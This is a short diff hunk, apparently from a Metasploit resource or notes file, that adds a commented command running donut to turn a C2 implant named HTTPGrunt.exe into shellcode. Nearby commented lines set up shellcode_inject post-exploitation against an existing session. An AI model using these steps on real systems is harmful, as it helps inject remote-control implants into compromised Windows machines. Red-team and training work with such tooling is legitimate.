@@ -18,6 +18,7 @@ exploit -j
 
 
 #INJECT
+#C:\payloads> C:\tools\donut\donut.exe HTTPGrunt.exe -e1 -a2 -b1 -f1 -x1 -o HTTPGrunt.bin
 #use post/windows/manage/shellcode_inject
 #sessions
 #set SESSION 1
